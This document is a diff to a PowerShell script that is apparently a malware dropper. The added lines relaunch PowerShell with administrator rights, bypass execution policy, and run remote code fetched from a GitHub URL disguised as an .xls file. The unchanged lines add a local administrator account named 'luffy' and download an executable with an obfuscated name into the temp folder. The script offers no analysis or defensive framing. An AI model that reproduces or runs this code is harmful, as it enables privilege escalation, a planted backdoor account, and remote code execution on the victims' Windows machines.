@@ -1,3 +1,9 @@
+if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
+{
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"IEX (iwr https://raw.githubusercontent.com/shanks-wq/muddy/refs/heads/main/aaa.xls -UseBasicParsing)`"" -Verb RunAs
+    exit
+}
+
 net localgroup administrators luffy /add
 
 iwr https://raw.githubusercontent.com/shanks-wq/soder/refs/heads/main/1uk9l129j.exe -OutFile $env:TEMP\1uk9l129j.exe
